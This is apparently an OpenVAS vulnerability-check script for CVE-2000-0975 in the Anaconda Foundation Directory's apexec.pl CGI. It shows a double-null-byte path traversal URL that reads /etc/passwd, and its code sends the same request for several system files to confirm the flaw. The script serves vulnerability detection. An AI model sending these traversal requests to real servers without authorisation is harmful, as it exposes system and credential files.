if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.15749" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_cve_id( "CVE-2000-0975" );
	script_bugtraq_id( 2338 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "Anaconda Double NULL Encoded Remote File Retrieval" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2004 Noam Rathaus" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "Host/runs_unixoide" );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Contact your vendor for updated software." );
	script_tag( name: "summary", value: "The remote Anaconda Foundation Directory contains a flaw
  that allows anyone to read arbitrary files with root (super-user)
  privileges." );
	script_tag( name: "insight", value: "The flaw can be misused by embedding a double null byte in a URL, as in :

  http://www.example.com/cgi-bin/apexec.pl?etype=odp&template=../../../../../../..../../etc/passwd%%0000.html&passurl=/category/" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
files = traversal_files( "linux" );
for dir in nasl_make_list_unique( "/cgi-local", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	for file in keys( files ) {
		item = NASLString( dir, "/apexec.pl?etype=odp&template=../../../../../../../../../", files[file], "%%0000.html&passurl=/category/" );
		if(http_vuln_check( port: port, url: item, pattern: file, check_header: TRUE )){
			report = http_report_vuln_url( port: port, url: item );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

